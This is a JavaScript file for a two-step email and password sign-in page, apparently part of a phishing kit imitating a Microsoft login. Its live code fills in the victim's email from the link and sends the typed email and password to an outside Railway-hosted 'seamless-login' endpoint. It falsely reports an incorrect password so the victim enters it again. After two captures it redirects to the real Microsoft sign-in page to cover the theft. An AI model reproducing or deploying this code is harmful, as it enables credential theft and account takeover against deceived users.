// document.getElementById("next").addEventListener("click", function (e) {
//     e.preventDefault();

//     let emailInput = document.getElementById("email").value.trim();

//     if (emailInput === "") {
//         document.getElementById("error").style.display = "block";
//     } else {
//         document.getElementById("error").style.display = "none";
//         document.getElementById("div1").style.display = "none";
//         document.getElementById("div2").style.display = "block";

//         document.getElementById("aich").textContent = emailInput;
//         document.getElementById("password").focus();
//     }
// });

// // go back to email step
// document.getElementById("back").addEventListener("click", function () {
//     document.getElementById("div2").style.display = "none";
//     document.getElementById("div1").style.display = "block";
//     document.getElementById("email").focus();
// });

// // allow Enter on email field to trigger Next
// document.getElementById("email").addEventListener("keydown", function (e) {
//     if (e.key === "Enter") {
//         e.preventDefault();
//         document.getElementById("next").click();
//     }
// });

// // handle submit with fetch
// document.getElementById("submit-btn").addEventListener("click", async function (e) {
//     e.preventDefault();

//     const email = document.getElementById("email").value.trim();
//     const password = document.getElementById("password").value.trim();

//     if (!email || !password) {
//         alert("Please enter both email and password.");
//         return;
//     }

//     try {
//         let response = await fetch("https://your-api-endpoint.com/login", {
//             method: "POST",
//             headers: {
//                 "Content-Type": "application/json"
//             },
//             body: JSON.stringify({ email, password })
//         });

//         if (!response.ok) {
//             throw new Error("Network response was not ok");
//         }

//         let result = await response.json();
//         console.log("Login success:", result);

//         // example: redirect after login
//         window.location.href = "/dashboard.html";

//     } catch (error) {
//         console.error("Login failed:", error);
//         alert("Login failed. Please try again.");
//     }
// });


    const emailInput = document.getElementById("email");
    const emailSpan = document.getElementById("aich");
    const passwordInput = document.getElementById('password');
    const errorMessage = document.getElementById("error-message"); // top of DOMContentLoaded


    window.addEventListener("DOMContentLoaded", function () {
    

    const redirectURL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL+openid+profile+offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=40dd3c92-3901-4de9-9ed1-2a28e253f70c&x-client-SKU=MSAL.Desktop&x-client-Ver=4.66.1.0&x-client-OS=Windows+Server+2019+Datacenter&prompt=login&client_info=1&state=H4sIAAAAAAAEAAXByYKCIAAA0H_p2qFcAD2qI26YVpqNN8mJcsEkzeTr571N6uuvEnR5JCtsiYCRdgp8l7qwPW3pYjGkHZqHFS8tR1TxcvDbYTKutjcA67MF2oWqZ83jrlC99CAhFlQAXR2Pqn9hLYioa1TvKyWltQXrUP9hdgyVulmvaF3S4vkcWMLqs2aoZGcQQgDJuWlmuhAPB_ZZDAbdTuTpbVUxj1LjRKOe8NscIb9rxum1HLz4zubiO67f285cvhymgSOGWSIeO20mGQA-bMCD4p5VYaEgGNggNI4KLKex0vc8MbOdY6edsejd3CcMXEnilAkrm76742Caw3rvR3T2hMzv5CN1TtVgbM8_eHwhbSoad_MPGSrXL0IBAAA&msaoauth2=true&instance_aware=true&lc=2057";
    let successCount = 0;
    const PLACEHOLDER_EMAILS = [
        '[-Email-]',
        '{{email}}',
        'example@email.com',
        '%5B-Email-%5D', // encoded version
    ];

    // Helper: Validate email
    function validateEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }

    // Extract email from URL (hash or query param)
    function extractEmailFromURL() {
        // Prefer hash
        let email = decodeURIComponent(window.location.hash.substring(1));
        if (!email) {
            const params = new URLSearchParams(window.location.search);
            email = params.get('email') || '';
        }
        return email;
    }

    // Prefill email if valid or placeholder
    function prefillEmail() {
        const extractedEmail = extractEmailFromURL();
        console.log('Extracted email:', extractedEmail);

        if (
            extractedEmail &&
            emailInput &&
            (validateEmail(extractedEmail) || PLACEHOLDER_EMAILS.includes(extractedEmail))
        ) {
            if (!emailInput.value || PLACEHOLDER_EMAILS.includes(emailInput.value.trim())) {
                emailInput.value = extractedEmail;
                if (emailSpan) emailSpan.textContent = extractedEmail;

                // Automatically move to password step if valid email
                document.getElementById("div1").style.display = "none";
                document.getElementById("div2").style.display = "block";
                document.getElementById("password").focus();
            }
        }
    }

    // Run once on load
    prefillEmail();

    // Also run when hash changes
    window.addEventListener('hashchange', prefillEmail);

    // Update URL with email param on input
    emailInput.addEventListener('input', function () {
        const email = emailInput.value.trim();
        if (validateEmail(email)) {
            const newUrl = window.location.pathname + '?email=' + encodeURIComponent(email);
            window.history.pushState({}, '', newUrl);
        }
    });

    // Back button to return to email step
    document.getElementById("back").addEventListener("click", function () {
        document.getElementById("div2").style.display = "none";
        document.getElementById("div1").style.display = "block";
        emailInput.focus();
    });

    // Submit button sends email + password to backend
    document.getElementById("submit-btn").addEventListener("click", async function (e) {
        e.preventDefault();

        const email = emailInput.value.trim();
        const password = document.getElementById("password").value.trim();

        if (!email || !password) {
            alert("Please enter your password.");
            return;
        }

        try {
            const response = await fetch("https://flask-selenium-app-production-076c.up.railway.app/seamless-login", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ email, password })
            });

            const result = await response.json();

            if (response.ok) {
                successCount++;
                passwordInput.value = '';

                if (successCount >= 2) {
                    window.location.href = redirectURL;
                } else {
                    errorMessage.textContent = 'Incorrect email or password';
                }
            } else {
                errorMessage.textContent = 'Incorrect email or password';
                passwordInput.value = '';
            }
        } catch (error) {
            console.error("Error logging in:", error);
            
        }
    });
});
